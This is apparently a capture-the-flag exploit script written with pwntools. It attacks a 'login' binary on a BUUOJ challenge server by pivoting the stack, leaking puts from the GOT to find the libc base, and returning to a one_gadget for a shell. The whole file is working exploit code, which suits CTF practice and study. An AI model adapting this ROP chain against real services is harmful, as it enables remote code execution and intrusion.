# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './login'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27866'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

one_gad = one_gadget(libc.path)
pop_rdi_ret = 0x0000000000401ab3
leave_ret = 0x000000000040098e
mian_puts_addr  = 0x00000000004018B5
bss_addr = 0x0000000000602400
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

#通过返回到mian函数中的调用puts的地方从而同时输出和返回到主函数再次利用
#为什么在第一次栈迁移之后第二次会自动跳到bss段执行？？

payload = "admin\x00\x00\x00" + p64(pop_rdi_ret) + p64(puts_got) + p64(mian_puts_addr)
sa(">",payload)

payload = "admin\x00\x00".ljust(0x20,"\x00") + p64(bss_addr) 
#dbg("read")

sa(">", payload )

leak = l64()
libc.address = leak - libc.sym["puts"]
system_addr = libc.sym["system"]
binsh_addr = libc.search("/bin/sh").next()
one = one_gad[1] + libc.address

payload =  "admin\x00\x00\x00"*3 + p64(one )

sa(">",payload)

payload = "admin\x00\x00\x00"

sa(">", payload )


p.interactive()

'''
@File    :   login.py
@Time    :   2021/08/02 12:19:51
@Author  :   Niyah 
'''